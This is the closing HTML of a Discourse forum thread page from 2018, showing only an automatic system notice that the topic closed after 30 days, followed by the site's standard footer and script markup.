              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/system.html'><span itemprop='name'>system</span></a>
                (system)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-05-08T21:59:05Z' class='post-time'>
                    May 8, 2018,  9:59pm
                  </time>
                  <meta itemprop='dateModified' content='2018-05-08T21:59:05Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="OwSrjDGHwZCRKwPjw2CZk38K0"></script>
  </body>
  
</html>
